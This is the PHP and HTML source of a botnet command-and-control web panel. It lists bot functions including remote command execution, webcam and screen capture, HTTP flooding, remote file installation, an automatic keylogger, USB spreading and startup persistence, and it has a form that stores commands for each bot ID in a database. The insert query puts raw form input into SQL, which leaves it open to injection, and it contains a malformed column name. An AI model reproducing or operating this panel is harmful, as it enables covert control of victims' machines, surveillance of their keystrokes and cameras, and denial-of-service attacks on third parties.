
<!DOCTYPE html>
<html>
<head>
	  <style>

body {
    background-image: url("1747969.jpg");
    
}

  </style>
	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
<script src="js/bootstrap.min.js"></script>
	<title>Command center</title>
</head>
<body>
<?php
include 'header.php'
?>
<div class="row">
  <div class="col-md-6 col-md-offset-0"><h1 style="color:#92FAF1 ;font-size:200%"> root@k3rn3lr00t:~#./Command Center</h1>
</div>
</div>
<br>
<br>
<div class="row">
  <div class="col-xs-6 col-md-4"><br><ol><li>screenshoot</li><li>cmdexecution(cmd)</li><li>camshoot</li><li>download(filepath,filenamex) use //</li><li>httpflood(ip,port,time)</li><li>installfile(link,local_name)</li><li>#Keylogger Automatic</li><li>#Usb Automatic</li><li>#Run on start up Automatic</li><li>#Submit info Automatic</li></ol></div>
  <div class="col-xs-6 col-md-4"><img src="hitman_blue_fire_by_viklf-d4in9pa.jpg" alt="..." class="img-thumbnail"></div>
  <div class="col-xs-6 col-md-4"></div>
</div>

<br>
<br>
<form method="POST" action="">
<div class="form-group has-success">
  <label class="control-label" for="inputSuccess1">[+]BOT ID</label>
  <input type="text" class="form-control" id="id" name="id">
</div>
<div class="form-group has-success">
  <label class="control-label" for="inputSuccess1">[+]COMMAND</label>
  <input type="text" class="form-control" id="cmd" name="cmd">
</div>
<div class="form-group has-success">
  <label class="control-label" for="inputSuccess1">[+]PARAMETER NO 1 </label>
  <input type="text" class="form-control" id="par1" name="par1">
</div>
<div class="form-group has-success">
  <label class="control-label" for="inputSuccess1">[+]PARAMETER NO 2</label>
  <input type="text" class="form-control" id="par2" name="par2">
</div>
<div class="form-group has-success">
  <label class="control-label" for="inputSuccess1">[+]PARAMETER NO 3</label>
  <input type="text" class="form-control" id="par3" name="par3">
</div>
 <button type="submit" name="submit" value="submit" class="btn btn-primary btn-lg btn-block">Send Command</button>
</form>
</body>
</html>


<?php
include'include/connection.php';
if(isset($_POST["submit"]))
{
$id = $_POST["id"];
$cmd = $_POST["cmd"];
if(isset($_POST["par1"]))
{
	$par1 = $_POST["par1"];
}
else
{
	$par1 = '';
}

if(isset($_POST["par2"]))
{
	$par2 = $_POST["par2"];
}
else
{
	$par2 = '';
}
if(isset($_POST["par3"]))
{
  $par3 = $_POST["par3"];
}
else
{
  $par3 = '';
}

$mydate=getdate(date("U"));
$final =  $mydate[month].','.$mydate[mday].','.$mydate[year];

  $query = mysqli_query($conn, "INSERT INTO cmd (uid, command, statu$, Para1, Para2,datetime,para3) VALUES ( '$id', '$cmd','0','$par1','$par2','$final','$par3')");
  $row = mysqli_fetch_array($query);


  


}
?>
